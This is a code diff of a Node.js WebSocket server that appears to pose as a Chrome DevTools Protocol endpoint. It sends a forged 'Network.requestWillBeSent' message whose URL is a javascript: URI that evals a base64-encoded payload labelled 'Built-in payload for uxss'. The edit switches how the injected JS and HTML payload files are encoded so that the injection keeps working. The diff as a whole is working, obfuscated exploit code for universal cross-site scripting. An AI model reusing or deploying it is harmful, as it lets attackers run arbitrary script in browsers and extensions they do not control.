@@ -48,7 +48,7 @@ wss.on("connection", function connection(wss_con) {
         let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
         htmlFile.replace('`', '&#96;');
         let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
-        jsFile = jsFile.replace('`', '\\`').replace('\'', '\\\'').replace('"', '\\"');
+        // jsFile = jsFile.replace('`', '\\`').replace('\'', '\\\'').replace('"', '\\"');
         // console.log(result.payload1.toString());
         let json_msg = JSON.parse(msg.toString());
         let { id, method, params } = json_msg;
@@ -60,7 +60,7 @@ wss.on("connection", function connection(wss_con) {
                     method: "Network.requestWillBeSent",
                     params: {
                         request: {
-                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", jsFile).replace("%%EXTHTML%%", htmlFile).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url)})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
+                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", btoa(jsFile)).replace("%%EXTHTML%%", btoa(htmlFile)).replace(/%%updaterurl%%/g, JSON.parse(serverConfig).updater_url)})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                         },
                     },
                 }),
